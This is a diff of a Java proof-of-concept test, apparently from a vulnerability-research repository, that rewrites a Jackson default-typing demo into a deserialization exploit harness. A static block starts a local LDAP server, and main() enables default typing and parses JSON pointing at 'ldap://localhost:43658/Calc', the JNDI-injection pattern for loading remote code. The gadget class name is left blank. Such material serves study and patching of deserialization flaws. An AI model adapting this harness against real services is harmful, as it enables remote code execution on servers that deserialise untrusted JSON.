@@ -1,6 +1,9 @@
 package com.threedr3am.bug.jackson.test;
 
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.ParserConfig;
 import com.fasterxml.jackson.databind.ObjectMapper;
+import com.threedr3am.bug.server.LdapServer;
 import java.io.IOException;
 
 /**
@@ -8,62 +11,20 @@ import java.io.IOException;
  */
 public class PocTest {
 
-  public static void main(String[] args) throws IOException {
-    testGlobalDefaultType();
+  static {
+    //rmi server示例
+//    RmiServer.run();
+
+    //ldap server示例
+    LdapServer.run();
   }
 
-  private static void testGlobalDefaultType() throws IOException {
+  public static void main(String[] args) throws IOException {
     ObjectMapper mapper = new ObjectMapper();
     mapper.enableDefaultTyping();
-    // {"i":1,"object":["com.threedr3am.bug.jackson.test.DefaultTypeTest$B",{"i":2}]}
 
-    String json = "{\"obj\":[\"com.threedr3am.bug.jackson.test.DefaultTypeTest$B\",{\"i\":1}],\"i\":1}";
-    A a = mapper.readValue(json, A.class);
-    System.out.println(a.getObj().getClass().getName());
+    String json = "[\"\", {\"aaaaa\":\"ldap://localhost:43658/Calc\"}]";
+    mapper.readValue(json, Object.class);
   }
 
-  static class A {
-    private int i = 1;
-    private Object obj;
-
-    public int getI() {
-      return i;
-    }
-
-    public void setI(int i) {
-      this.i = i;
-    }
-
-    public Object getObj() {
-      return obj;
-    }
-
-    public void setObj(Object obj) {
-      this.obj = obj;
-    }
-  }
-
-  static class B {
-    private int i = 2;
-
-    public int getI() {
-      return i;
-    }
-
-    public void setI(int i) {
-      this.i = i;
-    }
-  }
-
-  static class C {
-    private int i = 3;
-
-    public int getI() {
-      return i;
-    }
-
-    public void setI(int i) {
-      this.i = i;
-    }
-  }
 }
